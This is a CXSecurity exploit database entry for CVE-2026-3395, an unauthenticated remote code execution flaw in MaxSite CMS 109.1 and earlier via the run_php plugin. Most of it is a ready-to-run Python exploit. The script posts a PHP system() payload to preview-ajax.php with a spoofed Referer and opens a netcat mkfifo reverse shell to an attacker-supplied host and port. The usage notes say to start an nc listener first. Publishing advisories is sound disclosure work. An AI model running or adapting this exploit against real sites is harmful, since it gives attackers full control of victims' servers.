---
title: MaxSite CMS < = 109.1 unauthenticated RCE via run_php plugin
url: https://cxsecurity.com/issue/WLB-2026030005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-02
fetch_date: 2026-03-03T04:11:33.936164
---

# MaxSite CMS < = 109.1 unauthenticated RCE via run_php plugin

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **MaxSite CMS <= 109.1 unauthenticated RCE via run\_php plugin** **2026.03.02**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-3395](https://cxsecurity.com/cveshow/CVE-2026-3395/ "Click to see CVE-2026-3395")**  CWE: **[CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code)](https://cxsecurity.com/cwe/CWE-95%20%28Improper%20Neutralization%20of%20Directives%20in%20Dynamically%20Evaluated%20Code%29 "Click to see CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code)")**  **[**Dork:** NO](https://cxsecurity.com/dorks/)** | |

#!/usr/bin/env python3
# Exploit Title: MaxSite CMS <= 109.1 unauthenticated RCE via run\_php plugin
# CVE: CVE-2026-3395
# Date: 2026-03-01
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://max-3000.com/
# Software Link: https://github.com/maxsite/cms
# Affected: MaxSite CMS <= 109.1 with run\_php plugin enabled
# Tested on: MaxSite CMS 109.1
# Category: Webapps
# Platform: PHP
# Exploit Type: Remote Code Execution
# CVSS: 9.8 (Critical)
# CWE: CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code)
# Description: Unauthenticated RCE in preview-ajax.php through eval() in run\_php plugin
# Fixed in: MaxSite CMS 109.2 (commit 08937a3c5d672a242d68f53e9fccf8a748820ef3)
# Usage: python3 exploit.py <target> --lhost <your\_ip> --lport <your\_port>
#
# Examples:
# python3 exploit.py http://target.com --lhost 192.168.1.100 --lport 4444
#
# Options:
# --lhost Listener IP for reverse shell
# --lport Listener port
#
# Notes:
# Requires run\_php plugin to be enabled (common default)
# Bypasses weak referrer check
#
# How to Use
# Step 1: Start a listener (e.g. nc -lvnp 4444)
# Step 2: Run the exploit
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄▄ . ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-3395 • MaxSite CMS RCE via run\_php ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import requests
import base64
import argparse
import sys
def main():
parser = argparse.ArgumentParser(description="CVE-2026-3395 - MaxSite CMS unauthenticated RCE")
parser.add\_argument("target", help="Target URL (e.g. http://target.com)")
parser.add\_argument("--lhost", required=True, help="Listener IP for reverse shell")
parser.add\_argument("--lport", required=True, help="Listener port")
args = parser.parse\_args()
target = args.target.rstrip("/")
lhost = args.lhost
lport = args.lport
b64\_path = base64.b64encode(b"admin/plugins/editor\_markitup/preview-ajax.php").decode()
url = f"{target}/ajax/{b64\_path}"
revshell = f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
payload = f"[php]system('{revshell}');[/php]"
headers = {"Referer": target}
data = {"data": payload}
print(f"[\*] Sending payload to: {url}")
print(f"[\*] Reverse shell → {lhost}:{lport}")
try:
r = requests.post(url, data=data, headers=headers, timeout=12)
if r.status\_code == 200:
print("[+] Request sent successfully")
print("[+] Check your listener for connection")
else:
print(f"[-] Unexpected status code: {r.status\_code}")
print(f"Response: {r.text[:300]}...")
except Exception as e:
print(f"[-] Error: {str(e)}")
if \_\_name\_\_ == "\_\_main\_\_":
main()

**##### References:**

-

https://github.com/maxsite/cms/commit/08937a3c5d672a242d68f53e9fccf8a748820ef3

-

https://vuldb.com/?id.348281

-

https://vuldb.com/?ctiid.348281

-

https://vuldb.com/?submit.762169

-

https://nvd.nist.gov/vuln/detail/CVE-2026-3395

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top